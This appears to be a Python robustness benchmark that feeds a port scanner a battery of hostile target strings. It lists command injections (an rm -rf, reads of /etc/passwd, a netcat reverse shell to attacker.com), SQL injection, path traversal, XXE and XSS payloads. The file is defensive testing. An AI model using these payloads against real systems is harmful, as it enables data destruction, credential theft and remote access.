import asyncio
import os
import subprocess
import time
import sys
from datetime import datetime

# Add src and project root to sys.path
root_dir = os.path.abspath(os.path.join(os.path.dirname(__file__), "../../.."))
sys.path.append(root_dir)
sys.path.append(os.path.join(root_dir, "src"))

from tests.benchmarking.framework.base_benchmark import BaseBenchmark
from cybersec_cli.tools.network.port_scanner import PortScanner

# Disable caching for torture tests
try:
    from cybersec_cli.core.scan_cache import scan_cache
    if scan_cache:
        scan_cache.clear()
except:
    pass

class MaliciousInputBenchmark(BaseBenchmark):
    """
    Brutal benchmark for security robustness against malicious inputs.
    """
    def __init__(self):
        super().__init__("Malicious Input Torture")
        self.malicious_inputs = [
            # Command injection
            "127.0.0.1; rm -rf /",
            "127.0.0.1 && cat /etc/passwd",
            "; nc -e /bin/sh attacker.com 4444",
            "$(whoami)",
            "`id`",
            
            # SQL injection
            "' OR '1'='1",
            "1; DROP TABLE scans;--",
            "admin'--",
            
            # Path traversal
            "../../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            
            # Format string
            "%x%x%x%x%x%x%x",
            "%s%s%s%s%s%s",
            
            # Buffer overflow attempts
            "A" * 10000,
            "A" * 100000,
            
            # NULL bytes
            "127.0.0.1\x00",
            "127.0.0.1%00",
            
            # Unicode attacks
            "127.0.0.1\u202e",  # RTL override
            "127.0.0.1\ufeff",  # BOM
            
            # XML/HTML injection
            "<script>alert('xss')</script>",
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
            
            # Invalid IP formats
            "999.999.999.999",
            "256.256.256.256",
            "-1.-1.-1.-1",
            "0.0.0.0",
        ]

    async def run_benchmark(self):
        print(f"\n--- Injection Attack Battery ({len(self.malicious_inputs)} inputs) ---")
        
        results_log = []
        success_count = 0
        for i, evil_input in enumerate(self.malicious_inputs):
            print(f"  [{i+1}/{len(self.malicious_inputs)}] Testing: {repr(evil_input)}")
            start_time = time.time()
            try:
                # We expect the PORT SCANNER to either:
                # 1. Raise a ValueError (Validation)
                # 2. Fail to resolve (Safe)
                # 3. Handle gracefully without executing/crashing
                scanner = PortScanner(target=evil_input, ports=[80], timeout=0.1)
                await scanner.scan()
                res = "Graceful Rejection / No Results"
                success_count += 1
            except ValueError as e:
                # This is a SUCCESS: The scanner properly validated and rejected the input
                res = f"Safe Rejection: {e}"
                success_count += 1
            except Exception as e:
                res = f"Caught Unexpected Exception: {type(e).__name__}: {e}"
            
            duration = time.time() - start_time
            results_log.append({
                "input": evil_input,
                "duration": duration,
                "result": res
            })

        print(f"\n  Completed {len(self.malicious_inputs)} tests. Success/Rejection: {success_count}/{len(self.malicious_inputs)}")
        self.results.append({"step": "injection_battery", "success": success_count > 0, "count": len(self.malicious_inputs)})

    def save_results(self, filename=None):
        print("\n" + "="*60)
        print("TORTURE SUMMARY")
        print("="*60)
        for r in self.results:
            status = "✅ PASSED" if r.get("success") else "❌ FAILED"
            print(f"{r['step']}: {status}")
        print("="*60 + "\n")
        
        if filename is None:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"{self.name.replace(' ', '_').lower()}_{timestamp}.json"

        filepath = self.output_dir / filename
        results_dict = {
            "benchmark_name": self.name,
            "timestamp": datetime.now().isoformat(),
            "results": self.results,
        }
        import json
        with open(filepath, "w") as f:
            json.dump(results_dict, f, indent=2)
        return filepath

if __name__ == "__main__":
    benchmark = MaliciousInputBenchmark()
    asyncio.run(benchmark.run_benchmark())
    benchmark.save_results()
